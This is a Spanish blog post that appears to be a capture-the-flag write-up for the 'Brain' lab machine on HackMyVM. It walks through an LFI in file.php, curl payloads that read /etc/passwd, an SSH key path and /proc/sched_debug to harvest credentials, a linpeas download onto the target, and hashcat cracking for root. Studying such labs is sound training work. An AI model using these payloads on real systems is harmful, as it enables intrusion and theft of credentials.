---
layout: single
title: HackMyVm Brain Writeup
excerpt: En este artículo enseño a cómo vulnerar la máquina Brain de HackMyVM.
date: 2022-01-02
classes: wide
tags:
  - Writeup
  - Hacking
  - HackMyVM
---

# Brain Writeup

En este post os enseñaré a como vulnerar la máquina Brain de la platadorma HackMyVM. La máquina está categorizada como Easy.

## Reconocimiento

### Reconocimiento de la IP

La máquina ya te da la pista de cual es su IP, pero no obstante os enseñaré a como identificarla:
```bash
┌─[root@rijaba1-pc]─[~/Desktop/Brain]
└──╼ #fping -a -g 192.163.0.0/24 2>/dev/null
192.163.0.1 
192.163.0.2 
192.163.0.3 
192.163.0.8  # Mi IP
192.163.0.53 # IP de la máquina

```
En mi caso hay mas IP debido a que las máquinas virtuales están conectadas a una red NAT creada por VirtualBox.

### NMAP

Para descubrir los puertos abiertos de la máquina usamos NMAP pero también podemos usar otras herramientas como [portDiscoverSH](http://127.0.0.1:4000/herramienta-portDiscoverSH/)

```bash
┌─[root@rijaba1-pc]─[~/Desktop/Brain/nmap]
└──╼ #nmap -p- --open -T5 -v -n 192.163.0.53

Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-02 15:35 CET
Initiating ARP Ping Scan at 15:35
Scanning 192.163.0.53 [1 port]
Completed ARP Ping Scan at 15:35, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:35
Scanning 192.163.0.53 [65535 ports]
Discovered open port 80/tcp on 192.163.0.53
Discovered open port 22/tcp on 192.163.0.53
Completed SYN Stealth Scan at 15:35, 4.73s elapsed (65535 total ports)
Nmap scan report for 192.163.0.53
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:1A:B4:8C (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.89 seconds
	Raw packets sent: 65543 (2.884MB) | Rcvd: 65543 (2.622MB)
```

Este comando sirve para descubrir los puertos **abiertos** de la máquina, el parámetro -T5 es la plantilla de tempoizado, que comprende desde el 1 al 5, yo recomiendo usar -T4 debido a que el -T5 puede llegar a saltarse algún puerto abierto (yo uso el -T5 por qué ya había hecho el escaneo antes).

```bash
┌─[root@rijaba1-pc]─[~/Desktop/Brain/nmap]
└──╼ #nmap -sCV -p22,80 192.163.0.53
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-02 15:39 CET
Nmap scan report for 192.163.0.53
Host is up (0.00028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 32:95:f9:20:44:d7:a1:d1:80:a8:d6:95:91:d5:1e:da (RSA)
|   256 07:e7:24:38:1d:64:f6:88:9a:71:23:79:b8:d8:e6:57 (ECDSA)
|_  256 58:a6:da:1e:0f:89:42:2b:ba:de:00:fc:71:78:3d:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:1A:B4:8C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds

```
Este comando de nmap nos permite averiguar las versiones y servicios que están ejecutandose en los puertos 22 y 80, el parámetro -sCV es una fusión del parámetro -sC y -sV.


### Fuzzing

Cuando entramos en internet y teclamos http://IP:80/ no sale nada interesante...



Para descubrir posibles rutas usaremos gobuster, también se pueden usar herramientas como wfuzz que emplearemos más adelante

```bash
┌─[root@rijaba1-pc]─[~/Desktop/Brain]
└──╼ #gobuster dir -u 'http://192.163.0.53/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.163.0.53/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2022/01/02 15:44:51 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/robots.txt           (Status: 200) [Size: 162]  
/brainstorm           (Status: 301) [Size: 317] [--> http://192.163.0.53/brainstorm/]
/server-status        (Status: 403) [Size: 277]                                      
                                                                                     
===============================================================
2022/01/02 15:46:32 Finished
===============================================================
```
Con este comando buscamos todas las direcciones con formato .html, .php y .txt. Aquí lo que más llama la atención es /brainstorm. Vamos a ver lo que se muestra en el navegador cuando entramos:

<p align="center">
	<img src="/assets/images/brain-hackmyvm-writeup/IMG1.PNG">
</p>



Nada interesante...

Ahora vamos a hacer el mismo fuzzing que antes sobre el directorio /brainstorm

```bash
┌─[root@rijaba1-pc]─[~/Desktop/Brain]
└──╼ #gobuster dir -u 'http://192.163.0.53/brainstorm/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.163.0.53/brainstorm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2022/01/02 15:49:21 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 80]
/file.php             (Status: 200) [Size: 0] 
                                              
===============================================================
2022/01/02 15:51:02 Finished
===============================================================
```

Al entrar en /file.php no encontramos nada podríamos estar delante de una Web Shell o de un LFI (Local File Inclusion), primero vamos a probar a ver si es un LFI, para ello vamos a usar la herramienta wfuzz:

```bash
┌─[root@rijaba1-pc]─[~/Desktop/Brain]
└──╼ #wfuzz -c -t 200 --hh=0 -u 'http://192.163.0.53/brainstorm/file.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.163.0.53/brainstorm/file.php?FUZZ=/etc/passwd
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000759:   200        26 L     38 W       1401 Ch     "file"
```

Rápidamente encontramos file, esto significa que estamos ante un LFI, al entrar al navegador nos encontramos con esto:

<p align="center">
	<img src="/assets/images/brain-hackmyvm-writeup/IMG2.PNG">
</p>


## Obtener Acceso

Para que sea más fácil de entender podemos hacer uso de curl:

```bash
┌─[root@rijaba1-pc]─[~/Desktop/Brain]
└──╼ #curl 'http://192.163.0.53/brainstorm/file.php?file=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
salomon:x:1000:1000:salomon,,,:/home/salomon:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```
Encontamos a un usuario llamado salomon, dado que está el servicio SSH en funcionamiento podemos intentar robarle la clave id_rsa:

```bash
┌─[root@rijaba1-pc]─[~/Desktop/Brain]
└──╼ #curl 'http://192.163.0.53/brainstorm/file.php?file=/home/salomon/.ssh/id_rsa'
┌─[root@rijaba1-pc]─[~/Desktop/Brain]
└──╼ #
```
En este caso no podemos hacerlo, ahora lo que podemos intentar es buscar algún _log_ o archivo que nos pueda dar alguna pista.

En este punto vamos a comprobar si tenemos permiso de lectura del archivo '/proc/sched_debug', el cual nos daría información sobre los procesos que se están ejecutando en la máquina víctima:

```bash
┌─[✗]─[root@rijaba1-pc]─[~/Desktop/Brain]
└──╼ #curl 'http://192.163.0.53/brainstorm/file.php?file=/proc/sched_debug'

-----------

runnable tasks:
 S           task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
-----------------------------------------------------------------------------------------------------------
 S        systemd     1     63716.678589      2552   120         0.000000       569.418285         0.000000 0 0 /
 S       kthreadd     2     63730.424674       138   120         0.000000         1.230426         0.000000 0 0 /
 I         rcu_gp     3       115.023572         2   100         0.000000         0.001783         0.000000 0 0 /
 I     rcu_par_gp     4       116.523710         2   100         0.000000         0.000963         0.000000 0 0 /
 I   kworker/0:0H     6       873.675936         6   100         0.000000         0.020983         0.000000 0 0 /
 I   kworker/u2:0     7     63680.909027       683   120         0.000000        49.459140         0.000000 0 0 /
 I   mm_percpu_wq     8       122.093852         2   100         0.000000         0.001041         0.000000 0 0 /
 S    ksoftirqd/0     9     63734.905091     96268   120         0.000000      2008.140206         0.000000 0 0 /
 I      rcu_sched    10     63738.789502    201645   120         0.000000      1101.001688         0.000000 0 0 /
 I         rcu_bh    11       128.095063         2   120         0.000000         0.000611         0.000000 0 0 /
 S    migration/0    12         0.000000      2052     0         0.000000        44.676092         0.000000 0 0 /
 S        cpuhp/0    14      1169.032602        11   120         0.000000         0.087116         0.000000 0 0 /
 S      kdevtmpfs    15      1192.514680       148   120         0.000000         0.370252         0.000000 0 0 /
 I          netns    16       140.113027         2   100         0.000000         0.001332         0.000000 0 0 /
 S        kauditd    17      1157.126260         4   120         0.000000         0.023842         0.000000 0 0 /
 S     khungtaskd    18     63697.348687        69   120         0.000000         1.633504         0.000000 0 0 /
 S     oom_reaper    19       146.114372         2   120         0.000000         0.000883         0.000000 0 0 /
 I      writeback    20       148.114399         2   100         0.000000         0.001175         0.000000 0 0 /
 S     kcompactd0    21       150.115346         2   120         0.000000         0.001261         0.000000 0 0 /
 S           ksmd    22       152.116626         2   125         0.000000         0.001198         0.000000 0 0 /
 S     khugepaged    23     63741.749832       817   139         0.000000        71.709128         0.000000 0 0 /
 I         crypto    24       156.116209         2   100         0.000000         0.001691         0.000000 0 0 /
 I    kintegrityd    25       158.116328         2   100         0.000000         0.001214         0.000000 0 0 /
 I        kblockd    26       160.116910         2   100         0.000000         0.001825         0.000000 0 0 /
 I    edac-poller    27       172.502000         2   100         0.000000         0.001684         0.000000 0 0 /
 I     devfreq_wq    28       174.002316         2   100         0.000000         0.001356         0.000000 0 0 /
 S      watchdogd    29         0.000000         2     0         0.000000         0.001319         0.000000 0 0 /
 S        kswapd0    30     62396.089862       789   120         0.000000       519.895016         0.000000 0 0 /
 I       kthrotld    48       556.008766         2   100         0.000000         0.002137         0.000000 0 0 /
 I  ipv6_addrconf    49       557.208873         2   100         0.000000         0.001312         0.000000 0 0 /
 I          kstrp    59       583.981637         2   100         0.000000         0.001553         0.000000 0 0 /
 I        ata_sff   103       695.238146         2   100         0.000000         0.002432         0.000000 0 0 /
 S      scsi_eh_0   105       797.647303         4   120         0.000000        11.211631         0.000000 0 0 /

----------------

 S    in:imuxsock   333     63658.826278       219   120         0.000000         3.917773         0.000000 0 0 /
 S      in:imklog   334      8713.100742         5   120         0.000000         0.512810         0.000000 0 0 /
 S  rs:main Q:Reg   341     63658.829305       275   120         0.000000         4.945284         0.000000 0 0 /
 S           cron   328      1178.142641        37   120         0.000000         1.320024         0.000000 0 0 /
 S       dhclient   346     63658.947787       299   120         0.000000        15.911270         0.000000 0 0 /
 S             sh   350      1181.323932         8   120         0.000000         0.450660         0.000000 0 0 /
 Ssalomon:XXXXXXX   355      1182.800227        19   120         0.000000         0.992876         0.000000 0 0 /
 S         python   369     63738.785020     16658   120         0.000000       766.599960         0.000000 0 0 /
 S          sleep   370      1185.145485         4   120         0.000000         0.330095         0.000000 0 0 /
 S         agetty   394     63639.075848        54   120         0.000000         4.815542         0.000000 0 0 /
 S           sshd   400     47171.787284        79   120         0.000000         9.011313         0.000000 0 0 /
 S        apache2   447     63738.813279      8278   120         0.000000       426.373394         0.000000 0 0 /
 S        apache2   933     62402.551365    120465   120         0.000000     11680.783599         0.000000 0 0 /
 S        apache2   935     62402.570149    121210   120         0.000000     11652.524825         0.000000 0 0 /
 S           sshd   957     23631.807253        73   120         0.000000        12.466195         0.000000 0 0 /
 S        systemd   960     24078.702466        80   120         0.000000        12.362455         0.000000 0 0 /
 S       (sd-pam)   961     23603.286953         3   120         0.000000         0.079491         0.000000 0 0 /
 S           sshd   969     43696.981737      2929   120         0.000000        80.065888         0.000000 0 0 /
 S           bash   970     43652.951614       840   120         0.000000        48.213812         0.000000 0 0 /
 S             su 11753     43663.369220        18   120         0.000000         5.684415         0.000000 0 0 /
 S           bash 11754     43697.027139        61   120         0.000000        10.535508         0.000000 0 0 /
 S        apache2 12160     62402.521737    119215   120         0.000000     11441.040908         0.000000 0 0 /
 S        apache2 12175     62402.521261     60943   120         0.000000      5855.319223         0.000000 0 0 /
 S        apache2 12176     63556.634764     59731   120         0.000000      5756.314840         0.000000 0 0 /
 S        apache2 12178     63666.769308     59574   120         0.000000      5689.522428         0.000000 0 0 /
 I    kworker/0:0 12182     63738.858168      9678   120         0.000000       268.195123         0.000000 0 0 /
 S        apache2 12192     62402.547221        57   120         0.000000         9.196506         0.000000 0 0 /
 S        apache2 12293     63556.742439        14   120         0.000000         2.126920         0.000000 0 0 /
 S        apache2 12295     63615.246831        14   120         0.000000         1.884778         0.000000 0 0 /
>R        apache2 12296     63738.749832        13   120         0.000000         1.558960         0.000000 0 0 /
 I    kworker/0:1 12341     63733.416116       161   120         0.000000         6.446626         0.000000 0 0 /
 I    kworker/0:2 12351     63735.074048        74   120         0.000000         2.886262         0.000000 0 0 /
 I    kworker/0:3 12352     63736.412425         2   120         0.000000         0.001362         0.000000 0 0 /


```
He tenido que cortar la salida del comando porque era muy largo... Puede que parecer que no hay nada interesante, pero sí que lo hay, podemos ver que en una parte se menciona al ya conocido usuario salomon, seguido de dos puntos que parece su contraseña (yo le pusé X).

Con el siguiente comando vamos a intentar conectarnos por ssh con las credenciales:

```bash
┌─[✗]─[root@rijaba1-pc]─[~/Desktop/Brain]
└──╼ #ssh salomon@192.163.0.53
salomon@192.163.0.53's password: 
Linux Brain 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

BBBBBBBBBBBBBBBBB      RRRRRRRRRRRRRRRRR                     AAA                  IIIIIIIIII   NNNNNNNN        NNNNNNNN
B::::::::::::::::B     R::::::::::::::::R                   A:::A                 I::::::::I   N:::::::N       N::::::N
B::::::BBBBBB:::::B    R::::::RRRRRR:::::R                 A:::::A                I::::::::I   N::::::::N      N::::::N
BB:::::B     B:::::B   RR:::::R     R:::::R               A:::::::A               II::::::II   N:::::::::N     N::::::N
  B::::B     B:::::B     R::::R     R:::::R              A:::::::::A                I::::I     N::::::::::N    N::::::N
  B::::B     B:::::B     R::::R     R:::::R             A:::::A:::::A               I::::I     N:::::::::::N   N::::::N
  B::::BBBBBB:::::B      R::::RRRRRR:::::R             A:::::A A:::::A              I::::I     N:::::::N::::N  N::::::N
  B:::::::::::::BB       R:::::::::::::RR             A:::::A   A:::::A             I::::I     N::::::N N::::N N::::::N
  B::::BBBBBB:::::B      R::::RRRRRR:::::R           A:::::A     A:::::A            I::::I     N::::::N  N::::N:::::::N
  B::::B     B:::::B     R::::R     R:::::R         A:::::AAAAAAAAA:::::A           I::::I     N::::::N   N:::::::::::N
  B::::B     B:::::B     R::::R     R:::::R        A:::::::::::::::::::::A          I::::I     N::::::N    N::::::::::N
  B::::B     B:::::B     R::::R     R:::::R       A:::::AAAAAAAAAAAAA:::::A         I::::I     N::::::N     N:::::::::N
BB:::::BBBBBB::::::B   RR:::::R     R:::::R      A:::::A             A:::::A      II::::::II   N::::::N      N::::::::N
B:::::::::::::::::B    R::::::R     R:::::R     A:::::A               A:::::A     I::::::::I   N::::::N       N:::::::N
B::::::::::::::::B     R::::::R     R:::::R    A:::::A                 A:::::A    I::::::::I   N::::::N        N::::::N
BBBBBBBBBBBBBBBBB      RRRRRRRR     RRRRRRR   AAAAAAA                   AAAAAAA   IIIIIIIIII   NNNNNNNN         NNNNNNN


salomon@Brain:~$ ls
user.txt
salomon@Brain:~$ cat user.txt;echo
onXXXXXvDtAR7wZu3I8HKXXXX

salomon@Brain:~$
```
Bingo! Hemos ganado el acceso a la máquina y tenemos la flag del usuario

## Escalada de Privilegios

En este punto ya tenemos acceso a la máquina pero aún no somos el usuario con altos privilegios (root), para que sea más fácil la escalada de privilegios vamos a usar [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). LinPEAS es una herramienta que nos ayuda en esta fase.

Primero hay que transeferirse linpeas.sh a la máquina víctima:

```bash
# Nuestra máquina:
┌─[root@rijaba1-pc]─[~/Desktop/Brain/exploits]
└──╼ #wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F253%2Fmerge/linpeas.sh

---------

linpeas.sh                                      100%[====================================================================================================>] 744,96K  2,31MB/s    en 0,3s    

2022-01-02 16:16:52 (2,31 MB/s) - «linpeas.sh» guardado [762836/762836]

┌─[root@rijaba1-pc]─[~/Desktop/Brain/exploits]
└──╼ #python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

# Máquina Victima:
salomon@Brain:~$ cd /tmp/
salomon@Brain:/tmp$ wget http://192.163.0.8:8080/linpeas.sh
--2022-01-02 16:17:15--  http://192.163.0.8:8080/linpeas.sh
Conectando con 192.163.0.8:8080... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 762836 (745K) [text/x-sh]
Grabando a: “linpeas.sh”

linpeas.sh.1                                    100%[====================================================================================================>] 744,96K  --.-KB/s    en 0,004s  

2022-01-02 16:17:15 (172 MB/s) - “linpeas.sh” guardado [762836/762836]

```
Una vez hecho esto detenemos el servidor http montando en python y ejecutamos la herramienta:
```bash
salomon@Brain:/tmp$ chmod +x linpeas.sh
salomon@Brain:/tmp$ ./linpeas.sh 

```
Entre todo lo que hace la herramienta me sorprende la parte donde nos muestr todos los procesos que se están ejecutando:
```bash
╔══════════╣ Cleaned processes                                                                                                                                                      [549/727]
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                       
--------
root       370  0.0  0.0   5260   684 ?        S    13:45   0:00              _ sleep 999999999999999                                                                                        
root       312  0.0  0.3 225824  3536 ?        Ssl  13:45   0:00 /usr/sbin/rsyslogd -n -iNONE                                                                                                
root       346  0.0  0.5   9488  5732 ?        Ss   13:45   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6
.enp0s3.leases enp0s3                                                                                                                                                                        
root       369  0.0  1.3  22224 13360 ?        S    13:45   0:00 python /root/server.py 127.0.0.1:65000                                                                                      
root       394  0.0  0.1   5612  1544 tty1     Ss+  13:45   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux                                                                                
root       400  0.0  0.6  15852  6984 ?        Ss   13:45   0:00 /usr/sbin/sshd -D                                                                                                           
--------
```
Podemos ver que el usuario root está ejecutando un servidor con Python. Vamos a hacerle una petición GET al servidor:
```bash
salomon@Brain:/tmp$ wget 127.0.0.1:65000
--2022-01-02 16:23:08--  http://127.0.0.1:65000/
Conectando con 127.0.0.1:65000... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 192 [text/html]
Grabando a: “index.html”

index.html                                      100%[====================================================================================================>]     192  --.-KB/s    en 0s      

2022-01-02 16:23:08 (88,9 MB/s) - “index.html” guardado [192/192]

salomon@Brain:/tmp$ ls
index.html  systemd-private-d91299c48ef040feaec25068ed159d30-apache2.service-EZFh1S  systemd-private-d91299c48ef040feaec25068ed159d30-systemd-timesyncd.service-AoQJpy
salomon@Brain:/tmp$ cat index.html 
[+] You are a great Hacker!! I think you are looking for this:
065BB0B9A0C654E5B3B6XXXXXXXXXXXXXXXXXXXX09D941989EC4D728FBE3290E47D2058839215BBE6144F51E7FCE8A8C6XXXXXXXXXXXXXXX1D742251F5A17167
salomon@Brain:/tmp$ 
```
Parece que hemos encontrado un hash, vamos a crackearlo en local

### Crack del Hash

```bash
┌─[✗]─[root@rijaba1-pc]─[~/Desktop/Brain]
└──╼ #echo '065BB0B9A0C654E5B3B6XXXXXXXXXXXXXXXXXXXX09D941989EC4D728FBE3290E47D2058839215BBE6144F51E7FCE8A8C6XXXXXXXXXXXXXXX1D742251F5A17167' > hash
┌─[root@rijaba1-pc]─[~/Desktop/Brain]
└──╼ #hashcat -O -a0 -m1700 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...                                                                                                                                                                 
                                                                                                                                                                                             
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]                                                                
=============================================================================================================================                                                                
* Device #1: *********                                                                                       
                                                                                                                                                                                             

-------------------------------------------------------------------
                                                                                                                                                                                             
Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

065BB0B9A0C654E5B3B6XXXXXXXXXXXXXXXXXXXX09D941989EC4D728FBE3290E47D2058839215BBE6144F51E7FCE8A8C6XXXXXXXXXXXXXXX1D742251F5A17167:******
```

Hemos decifrado el hash! Ahora vamos a convertirnos en root proporcionando la contraseña decifrada.

```bash
salomon@Brain:/tmp$ su root
Contraseña: 
root@Brain:/tmp# cd
root@Brain:~# ls
index.html  root.txt  run_server.sh  server.py
root@Brain:~# cat root.txt;echo
gmC9GR0EMUXXXXXXXXXXXXXXX

root@Brain:~# 

```
¡Ya somos root, eso inplica que ya tenemos su flag!







